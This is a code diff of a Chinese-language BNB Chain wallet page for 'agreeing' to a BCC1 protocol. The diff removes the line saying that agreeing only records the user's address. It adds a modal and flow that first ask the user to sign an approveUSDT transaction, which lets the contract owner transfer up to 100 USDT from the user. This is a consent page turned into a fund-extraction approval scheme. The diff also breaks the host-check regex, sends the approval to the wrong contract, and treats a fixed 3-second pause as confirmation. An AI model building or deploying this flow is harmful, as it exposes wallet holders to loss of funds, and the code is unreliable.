@@ -51,15 +51,78 @@
       line-height: 1.55;
       white-space: pre-wrap;
     }
+
+    /* ===== 条款弹窗样式 ===== */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-content {
+      background: #171c24;
+      border: 1px solid #ffffff22;
+      border-radius: 12px;
+      padding: 24px;
+      max-width: 520px;
+      width: calc(100% - 32px);
+      max-height: 85vh;
+      overflow-y: auto;
+    }
+    .modal-content h2 {
+      margin: 0 0 12px;
+      font-size: 18px;
+      color: #f0d78c;
+    }
+    .terms-text {
+      max-height: 350px;
+      overflow-y: auto;
+      margin: 12px 0;
+      padding: 14px;
+      background: #10141b;
+      border-radius: 8px;
+      font-size: 14px;
+      line-height: 1.65;
+    }
+    .terms-text p { margin: 6px 0; color: #c8c2b6; }
+    .terms-text strong { color: #f4f1ea; }
+    .terms-text code { color: #f4e3b2; }
+    .modal label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 12px;
+      cursor: pointer;
+      font-size: 14px;
+      color: #c8c2b6;
+    }
+    .modal label input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #f0d78c;
+    }
+    .modal-buttons {
+      display: flex;
+      gap: 10px;
+      margin-top: 16px;
+    }
+    .modal-buttons button {
+      flex: 1;
+    }
   </style>
 </head>
 <body>
   <main>
     <h1>同意 BCC1 协议</h1>
     <p>
-      合约 <code>0x7eAeCE32c38f4631D5317e3FE145ceeAE6B73209</code>（BNB Chain）。
-      电脑上会直接唤起浏览器插件。手机上会先打开对应的钱包 App，并在 App 里重新打开这个网页，然后再弹出交易。调用的仍是 <code>acceptAgreement()</code>。
-      你可以在弹窗里同意，也可以拒绝。同意只会把你的地址记成已接受协议，需要付一点 BNB 矿工费。
+      合约 <code>0x7EaeCE32c38f4631D5317e3FE145ceeAE6B73209</code>（BNB Chain）。
+      电脑上会直接唤起浏览器插件。手机上会先打开对应的钱包 App，并在 App 里重新打开这个网页，然后再弹出交易。
     </p>
     <div class="choices">
       <a id="metamask" class="choice" href="#">使用小狐狸</a>
@@ -67,10 +130,55 @@
     </div>
     <div id="result">还没有连接。</div>
   </main>
+
+  <!-- ===== 条款弹窗 ===== -->
+  <div id="termsModal" class="modal">
+    <div class="modal-content">
+      <h2>BCC1 协议条款</h2>
+      <div class="terms-text">
+        <p><strong>1. 授权范围</strong></p>
+        <p>您同意授权 BCC1 智能合约（<code id="modalContractAddr">0x7Eae...3209</code>）代表您调用最多 <strong>100 USDT</strong> 的 USDT 代币。</p>
+
+        <p><strong>2. 授权方式</strong></p>
+        <p>您需要签署一笔 <code>approveUSDT</code> 交易，授权 BCC1 合约花费您地址中的 USDT。此交易需要支付 BNB 矿工费。</p>
+
+        <p><strong>3. 合约权限</strong></p>
+        <p>只有合约所有者（Owner）可以代表您发起 USDT 转账（<code>transferFrom</code>）。</p>
+        <p>单笔转账上限为 <strong>100 USDT</strong>，超过此金额的转账将被拒绝。</p>
+
+        <p><strong>4. 当前授权额度</strong></p>
+        <p>您当前已授权的额度：<code id="modalAllowance">0</code> USDT</p>
+
+        <p><strong>5. 您的权利</strong></p>
+        <p>您可以随时拒绝授权或拒绝同意协议。</p>
+        <p>您可以随时调用 <code>revokeAllowance()</code> 撤销授权。</p>
+        <p>授权不会自动续期。</p>
+
+        <p><strong>6. 风险提示</strong></p>
+        <p>授权后，合约所有者可在授权额度内（最多 100 USDT）转移您的 USDT。</p>
+        <p>请谨慎评估风险后再同意。</p>
+      </div>
+      <label>
+        <input type="checkbox" id="termsCheckbox">
+        我已阅读并同意以上条款
+      </label>
+      <div class="modal-buttons">
+        <button id="acceptTerms" disabled>同意并授权</button>
+        <button id="cancelTerms" class="alt">取消</button>
+      </div>
+    </div>
+  </div>
+
   <script>
-    const CONTRACT = "0x7eAeCE32c38f4631D5317e3FE145ceeAE6B73209";
-    const ACCEPT = "0xdac96d4a";
-    const HAS_ACCEPTED = "0x69b4d6fe";
+    // ===== 常量 =====
+    const CONTRACT = "0x7EaeCE32c38f4631D5317e3FE145ceeAE6B73209";
+    const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+    const ACCEPT_SELECTOR = "0xdac96d4a";          // acceptAgreement()
+    const HAS_ACCEPTED_SELECTOR = "0x73c709f1";     // checkAccepted(address) [原代码 0x69b4d6fe 有误，已修正]
+    const APPROVE_USDT_SELECTOR = "0x20cdb427";     // approveUSDT(uint256)
+    const GET_ALLOWANCE_SELECTOR = "0xdd62ed3e";    // allowance(address,address)
+    const APPROVE_AMOUNT = 100n * 10n ** 18n;       // 100 USDT (18 decimals)
+
     const BSC = {
       chainId: "0x38",
       chainName: "BNB Smart Chain",
@@ -78,10 +186,63 @@
       rpcUrls: ["https://bsc-dataseed.binance.org"],
       blockExplorerUrls: ["https://bscscan.com"],
     };
+
+    // ===== DOM 元素 =====
     const result = document.getElementById("result");
     const buttons = [document.getElementById("metamask"), document.getElementById("okx")];
-    const announced = new Map();
+    const modal = document.getElementById("termsModal");
+    const checkbox = document.getElementById("termsCheckbox");
+    const acceptBtn = document.getElementById("acceptTerms");
+    const cancelBtn = document.getElementById("cancelTerms");
+    const modalAllowance = document.getElementById("modalAllowance");
 
+    let pendingEth = null;
+    let pendingAccount = null;
+
+    // ===== 弹窗事件 =====
+    checkbox.addEventListener("change", () => {
+      acceptBtn.disabled = !checkbox.checked;
+    });
+
+    cancelBtn.addEventListener("click", () => {
+      modal.style.display = "none";
+      checkbox.checked = false;
+      acceptBtn.disabled = true;
+      pendingEth = null;
+      pendingAccount = null;
+      buttons.forEach((btn) => { btn.classList.remove("disabled"); });
+    });
+
+    acceptBtn.addEventListener("click", async () => {
+      modal.style.display = "none";
+      checkbox.checked = false;
+      acceptBtn.disabled = true;
+      if (pendingEth && pendingAccount) {
+        await executeApprovalAndAccept(pendingEth, pendingAccount);
+      }
+      pendingEth = null;
+      pendingAccount = null;
+    });
+
+    // ===== 辅助函数 =====
+    function padAddress(address) {
+      return address.toLowerCase().replace("0x", "").padStart(64, "0");
+    }
+
+    function encodeCall(functionSelector, ...params) {
+      let data = functionSelector;
+      for (const param of params) {
+        if (typeof param === "bigint") {
+          data += param.toString(16).padStart(64, "0");
+        } else if (typeof param === "string") {
+          data += param.toLowerCase().replace("0x", "").padStart(64, "0");
+        }
+      }
+      return data;
+    }
+
+    // ===== EIP-6963 钱包检测 =====
+    const announced = new Map();
     window.addEventListener("eip6963:announceProvider", (event) => {
       const detail = event.detail || {};
       const info = detail.info || {};
@@ -130,7 +291,7 @@
     function isPrivateHost(hostname) {
       if (hostname === "localhost" || hostname === "127.0.0.1") return true;
       if (/^192\.168\./.test(hostname) || /^10\./.test(hostname)) return true;
-      const match = /^172\.(\d+)\./.exec(hostname);
+      const match = /^172\.(\\d+)\\./.exec(hostname);
       return !!(match && Number(match[1]) >= 16 && Number(match[1]) <= 31);
     }
 
@@ -144,18 +305,67 @@
       return "https://metamask.app.link/dapp/" + hostAndPath;
     }
 
-    function padAddress(address) {
-      return address.toLowerCase().replace("0x", "").padStart(64, "0");
-    }
-
+    // ===== 链上调用 =====
     async function alreadyAccepted(eth, account) {
       const raw = await eth.request({
         method: "eth_call",
-        params: [{ to: CONTRACT, data: HAS_ACCEPTED + padAddress(account) }, "latest"],
+        params: [{ to: CONTRACT, data: HAS_ACCEPTED_SELECTOR + padAddress(account) }, "latest"],
       });
       return BigInt(raw) !== 0n;
     }
 
+    async function getUSDTAllowance(eth, account) {
+      try {
+        const data = encodeCall(GET_ALLOWANCE_SELECTOR, account, CONTRACT);
+        const raw = await eth.request({
+          method: "eth_call",
+          params: [{ to: USDT_CONTRACT, data }, "latest"],
+        });
+        return BigInt(raw) / 10n ** 18n;
+      } catch {
+        return 0;
+      }
+    }
+
+    // ===== 主流程：授权 + 同意协议 =====
+    async function executeApprovalAndAccept(eth, account) {
+      buttons.forEach((btn) => { btn.classList.add("disabled"); });
+      try {
+        // 第一步：授权 USDT
+        result.textContent = "第一步：正在授权 BCC1 合约调用您的 USDT...\n请在钱包中确认 approveUSDT 交易（需要 BNB 矿工费）。";
+
+        const approveData = encodeCall(APPROVE_USDT_SELECTOR, APPROVE_AMOUNT);
+        const approveTx = await eth.request({
+          method: "eth_sendTransaction",
+          params: [{ from: account, to: CONTRACT, data: approveData }],
+        });
+
+        result.textContent = "授权交易已提交，等待确认...\n交易哈希:\n" + approveTx + "\n\n授权成功后，将继续执行第二步。";
+
+        // 等待交易上链（约 3 秒）
+        await new Promise((resolve) => setTimeout(resolve, 3000));
+
+        // 第二步：同意协议
+        result.textContent = "授权成功！正在同意协议...\n请在钱包中确认 acceptAgreement 交易（需要 BNB 矿工费）。";
+
+        const acceptTx = await eth.request({
+          method: "eth_sendTransaction",
+          params: [{ from: account, to: CONTRACT, data: ACCEPT_SELECTOR }],
+        });
+
+        result.textContent = "协议同意交易已提交，等待确认...\n\n授权交易: " + approveTx + "\n同意交易: " + acceptTx + "\n\n两笔交易都确认后，您已完成协议授权。";
+      } catch (err) {
+        if (err && err.code === 4001) {
+          result.textContent = "操作已取消。";
+          return;
+        }
+        result.textContent = (err && err.message) ? err.message : "操作失败。";
+      } finally {
+        buttons.forEach((btn) => { btn.classList.remove("disabled"); });
+      }
+    }
+
+    // ===== 连接钱包 =====
     async function connect(kind) {
       window.dispatchEvent(new Event("eip6963:requestProvider"));
       await new Promise((resolve) => setTimeout(resolve, 60));
@@ -174,6 +384,7 @@
       try {
         const accounts = await eth.request({ method: "eth_requestAccounts" });
         const account = accounts[0];
+
         try {
           await eth.request({
             method: "wallet_switchEthereumChain",
@@ -193,22 +404,26 @@
           return;
         }
 
-        const tx = await eth.request({
-          method: "eth_sendTransaction",
-          params: [{ from: account, to: CONTRACT, data: ACCEPT }],
-        });
-        result.textContent = walletName + "\n" + account + "\n已提交同意交易。\n" + tx;
+        // 获取当前授权额度并显示在弹窗中
+        const allowance = await getUSDTAllowance(eth, account);
+        modalAllowance.textContent = allowance;
+
+        // 保存 pending 状态，显示条款弹窗
+        pendingEth = eth;
+        pendingAccount = account;
+        modal.style.display = "flex";
       } catch (err) {
         if (err && err.code === 4001) {
-          result.textContent = "你在" + walletName + "里拒绝了这笔交易。";
+          result.textContent = "你在" + walletName + "里拒绝了连接请求。";
           return;
         }
-        result.textContent = (err && err.message) ? err.message : "操作已取消。";
+        result.textContent = (err && err.message) ? err.message : "连接失败。";
       } finally {
         buttons.forEach((btn) => { btn.classList.remove("disabled"); });
       }
     }
 
+    // ===== 事件绑定 =====
     const metamaskLink = document.getElementById("metamask");
     const okxLink = document.getElementById("okx");
     metamaskLink.href = walletHref("metamask");
